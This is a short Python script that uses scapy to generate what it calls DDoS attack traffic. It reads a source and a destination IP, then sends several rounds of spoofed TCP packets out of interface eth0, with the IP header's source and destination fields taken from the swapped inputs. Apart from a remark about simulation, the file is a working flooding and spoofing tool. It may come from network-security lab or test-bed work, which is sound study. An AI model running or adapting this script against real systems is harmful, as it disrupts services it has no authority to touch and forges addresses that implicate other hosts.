import sys
import time
from os import popen
import logging
from scapy.all import sendp, IP, UDP, Ether, TCP
from random import randrange
import time


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

""" Python Program to Generate DDoS Attack Traffic """

""" 
The main function to generate Attack Traffic, it takes 2 arguments
source: The source IP which will generate attack traffic
destination: The destination IP which will be attacked by traffic
"""


def main():
    source = str(input("Enter Source IP : "))
    destination = str(input("Enter Destination IP : "))
    for i in range(5):
        launchAttack(source, destination)  # pass the arguments to the launchAttack function
        time.sleep(10)


# This function  is used to generate Attack traffic to simulate DDoS
def launchAttack(src, dst):
    # open interface eth0 to send packets
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

    # use for-loop to generate and send a 500 attack packets with less interval
    for i in range(500):
        packets = Ether() / IP(dst=src, src=dst) / TCP(dport=1, sport=80)

        # send packets with interval = 0.025 s
        sendp(packets, iface=interface.rstrip(), inter=0.025)


# main function call
if __name__ == "__main__":
    main()
